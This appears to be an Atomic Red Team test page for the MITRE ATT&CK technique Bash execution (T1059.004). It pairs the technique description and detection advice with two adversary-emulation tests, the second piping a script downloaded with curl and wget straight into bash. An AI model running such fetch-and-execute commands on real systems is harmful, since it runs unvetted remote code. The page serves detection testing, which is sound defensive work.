# T1059.004 - Command and Scripting Interpreter: Bash
Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Create and Execute Bash Shell Script
Creates and executes a simple bash script.

**Supported Platforms:** macos, linux
#### Attack Commands: Run with `sh`
```sh
sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"
sh -c "echo 'ping -c 4 8.8.8.8' >> #{script_path}"
chmod +x #{script_path}
sh #{script_path}
```

Invoke-AtomicTest T1059.004 -TestNumbers 1

### Atomic Test #2 - Command-Line Interface
Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.

**Supported Platforms:** macos, linux
#### Attack Commands: Run with `sh`
```sh
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
```

Invoke-AtomicTest T1059.004 -TestNumbers 2

## Detection
Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. 